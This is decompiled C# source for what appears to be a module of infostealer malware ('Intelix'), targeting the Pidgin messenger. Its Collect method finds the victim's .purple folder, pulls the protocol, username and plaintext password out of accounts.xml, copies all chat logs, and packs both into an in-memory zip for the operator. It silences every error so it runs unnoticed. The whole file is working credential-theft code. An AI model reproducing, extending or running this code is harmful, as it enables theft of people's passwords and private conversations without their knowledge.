using System;
using System.IO;
using System.Text;
using System.Xml;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001D RID: 29
	public class Pidgin : ITarget
	{
		// Token: 0x06000057 RID: 87 RVA: 0x000042BC File Offset: 0x000024BC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Pidgin";
				this.CollectAccounts(zip, text, counterApplications);
				this.CollectLogs(zip, text, counterApplications);
				bool flag2 = counterApplications.Files.Count > 0;
				if (flag2)
				{
					counterApplications.Files.Add("Pidgin\\");
					counter.Messangers.Add(counterApplications);
				}
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004340 File Offset: 0x00002540
		private void CollectLogs(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
		{
			try
			{
				string text = Path.Combine(pidginRoot, "logs");
				bool flag = Directory.Exists(text);
				if (flag)
				{
					string text2 = Path.Combine("Pidgin", "chatlogs");
					zip.AddDirectoryFiles(text, text2, true);
					counterApplications.Files.Add(text + " => " + text2);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000043B4 File Offset: 0x000025B4
		private void CollectAccounts(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
		{
			try
			{
				string text = Path.Combine(pidginRoot, "accounts.xml");
				bool flag = !File.Exists(text);
				if (!flag)
				{
					StringBuilder stringBuilder = new StringBuilder();
					XmlDocument xmlDocument = new XmlDocument();
					using (XmlReader xmlReader = XmlReader.Create(text, new XmlReaderSettings
					{
						IgnoreComments = true,
						IgnoreWhitespace = true
					}))
					{
						xmlDocument.Load(xmlReader);
					}
					XmlElement documentElement = xmlDocument.DocumentElement;
					bool flag2 = documentElement == null;
					if (!flag2)
					{
						foreach (object obj in documentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							bool flag3 = xmlNode.ChildNodes.Count >= 3;
							if (flag3)
							{
								XmlNode xmlNode2 = xmlNode.ChildNodes[0];
								XmlNode xmlNode3 = xmlNode.ChildNodes[1];
								XmlNode xmlNode4 = xmlNode.ChildNodes[2];
								string text2 = (xmlNode2 != null) ? xmlNode2.InnerText : null;
								string text3 = (xmlNode3 != null) ? xmlNode3.InnerText : null;
								string text4 = (xmlNode4 != null) ? xmlNode4.InnerText : null;
								bool flag4 = !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4);
								if (flag4)
								{
									stringBuilder.AppendLine("Protocol: " + text2);
									stringBuilder.AppendLine("Username: " + text3);
									stringBuilder.AppendLine("Password: " + text4);
									stringBuilder.AppendLine();
								}
							}
						}
						bool flag5 = stringBuilder.Length != 0;
						if (flag5)
						{
							string text5 = Path.Combine("Pidgin", "accounts.txt");
							zip.AddTextFile(text5, stringBuilder.ToString());
							counterApplications.Files.Add(text + " => " + text5);
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
